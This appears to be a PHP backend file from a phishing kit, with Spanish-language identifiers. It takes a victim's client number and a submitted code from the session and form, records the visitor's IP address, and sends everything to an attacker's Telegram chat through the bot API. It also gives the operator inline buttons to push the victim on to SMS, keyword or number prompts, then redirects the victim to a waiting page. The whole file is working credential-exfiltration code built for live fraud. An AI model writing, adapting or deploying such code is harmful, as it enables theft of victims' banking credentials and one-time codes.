<?php
session_start();

$usuario = $_SESSION['usuario'] ?? 'desconocido';
$codigo = $_POST['codigo'] ?? '';


function obtenerIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}
$ip = obtenerIP();

require_once("settings.php");
// Botones para seguir controlando desde Telegram
$keyboard = [
    "inline_keyboard" => [
        [
            ["text" => "📩 SMS", "callback_data" => "SMS|$usuario"],
            ["text" => "❓ Palabra clave", "callback_data" => "CLAVE|$usuario"]
        ],
        [
            ["text" => "📍 NUMERO", "callback_data" => "NUMERO|$usuario"],
            ["text" => "📧 SMSERROR", "callback_data" => "SMSERROR|$usuario"]
        ]
    ]
];

$mensaje = "📲 numero del cliente: $usuario\nNumero: $codigo\n🌐 IP: $ip";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
    "chat_id" => $chat_id,
    "text" => $mensaje,
    "reply_markup" => json_encode($keyboard)
]));

// Redirigir al cliente a espera.php
header("Location: espera.php");
exit;
?>
